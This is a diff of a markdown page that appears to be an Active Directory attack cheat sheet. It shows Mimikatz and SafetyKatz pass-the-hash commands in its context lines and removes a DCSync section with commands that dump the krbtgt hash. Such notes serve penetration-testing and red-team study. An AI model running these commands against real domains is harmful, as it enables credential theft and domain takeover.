@@ -161,9 +161,7 @@ Invoke-Mimikatz -command '"sekurlsa::pth /user:Administrator /domain:dom.local /
 ```
 {% endcode %}
 
-Creates a valid kerberos ticket using the ntlm hash of a user. Authenticate to Kerberos enabled Services afterfwards.
-
-\
+Creates a valid kerberos ticket using the ntlm hash of a user. Authenticate to Kerberos enabled Services afterfwards.\
 
 
 ## **🍳Kerberoasting**
@@ -225,18 +223,6 @@ Safetykatz.exe "sekurlsa::pth /user:administrator /domain:dom.local /aes256:hash
 </strong>
 
 </code></pre>
-
-## 🔁DCSync
-
-**To use the DCSync feature for getting krbtgt hash, execute the following command - require DA privs:**
-
-{% code overflow="wrap" %}
-```powershell
-Invoke-Mimikatz -command '"lsadump:dcsync /user:dom\krbtgt"'
-
-SafetyKatz.exe "lsadump::dcsync /user:dom\krbtgt" "exit"
-```
-{% endcode %}
 
 
 
